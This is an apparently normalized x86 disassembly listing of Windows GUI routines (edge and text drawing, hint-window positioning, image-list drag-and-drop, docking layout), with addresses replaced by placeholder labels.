push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_4456f8
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406b0c
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_43d93c
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_441ee4
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_43efc4
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_440188
sub_445764
push ebx
push esi
mov esi edx
call sub_455244
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406a8c
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_43efc4
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406a8c
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_43efc4
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_4457c8
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_4422ac
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_445800
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4457f8
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_445840
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43cef8
mov dl 0x1
mov eax [ r-xdata ]
call sub_41dd3c
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_43c9d4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_44589c
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_4032a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43cfd0
test bl bl
jle r-xdata
xor eax eax
call sub_43afc8
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_4458dc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41e074
xor eax eax
push ebp
push sub_445977
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41e564
xor eax eax
push ebp
push sub_445954
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44595b
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_41e564
retn
sub_445988
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4462c0
mov edx 0x80ffff
mov eax esi
call sub_43df98
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_41e3e0
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41dd08
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_4459f4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_441484
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40be6c
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_44141c
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_445a60
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_445ab6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445abd
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call ReleaseDC
retn
sub_445ac4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_445b5d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_41d400
mov eax ebx
call sub_440130
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_43ddf8
mov eax [ ebp - 0x14 ]
call sub_404534
push eax
mov eax [ ebx + 0x208 ]
call sub_41e4e4
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445b64
lea eax [ ebp - 0x14 ]
call sub_404074
retn
sub_445b6c
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_445bd8
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_445c63
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445c6a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43ddf8
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_41e320
mov edx eax
add edx 0x6
mov eax esi
call sub_43d5b4
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43ddf8
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_41e33c
mov edx eax
add edx 0x4
mov eax esi
call sub_43d5d8
sub_445c70
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_445e49
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43de28
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_43f068
mov eax [ esi ]
call sub_45ba7c
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_45ba88
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_45ba7c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_45ba70
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_45ba88
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_45ba64
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_45ba70
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_45ba64
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_441d2c
push 0x4
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445e50
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_404334
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_448f08
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call [ rw-data ]
sub_445e58
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_445e80
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_4129b0
mov eax esi
call sub_440130
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_404534
push eax
mov eax [ esi + 0x208 ]
call sub_41e4e4
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_445edc
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_4129b0
call sub_42c584
call sub_42c664
test al al
jne r-xdata
call sub_42c584
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_42ca24
push esp
push 0x1
push 0xf
push 0x0
call sub_42c584
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_42c724
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_445f48
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_442634
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_445f6c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_445fc4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_446084
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45bf50
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4249d8
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45bf50
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4249d8
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_446090
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44b02c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_44b200
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4460f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44be74
mov eax ebx
call sub_44b02c
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x6a ] 0x0
je r-xdata
push esi
push 0x0
call ImageList_GetDragImage
sub_44611c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_44b02c
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_445fc4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_44617c
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_446090
push 0x0
call ShowCursor
sub_44617c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_44b02c
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_4461e0
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_445f6c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_4461e0
push ebx
mov ebx eax
mov eax ebx
call sub_44b02c
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_446204
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44b02c
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_445f6c
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_446278
push ebx
push esi
mov esi eax
mov eax esi
call sub_44b02c
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_4461e0
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_4460d8
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4462c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_440324
mov dl 0x1
mov eax [ r-xdata ]
call sub_41dd3c
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_43c9d4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_44631c
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_4032a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_440448
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_44636c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41e074
xor eax eax
push ebp
push sub_44640a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_41e564
xor eax eax
push ebp
push sub_4463e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_43c9ec
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4463ee
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_41e564
retn
sub_44641c
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_4464b0
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_446438
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4464b0
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_446aa8
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_4464b0
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_4464e4
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_446574
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
mov edx 0x2
call sub_446574
jmp r-xdata
retn
sub_44652c
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_4465e0
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
mov edx 0x2
call sub_4465e0
jmp r-xdata
retn
sub_446574
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_4469a8
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_4465e0
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_446494
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_4469a8
push eax
mov eax esi
call sub_4464e4
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_4469a8
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_446690
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_446494
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_446aa8
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_4465e0
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_446494
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_4465e0
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_4464e4
mov edx eax
add edx esi
mov eax ebx
call sub_4469d0
mov edx edi
mov eax ebx
call sub_4469d0
jmp r-xdata
mov eax ebx
call sub_446830
mov eax ebx
call sub_446a80
mov ebx eax
test ebx ebx
jne r-xdata
sub_446738
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_404074
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_4040c8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
sub_44677c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_40349c
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_4467ed
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_43eb10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_446800
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_446a80
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_446830
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4465e0
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4465e0
mov esi eax
push ebp
call sub_446800
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_446a80
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
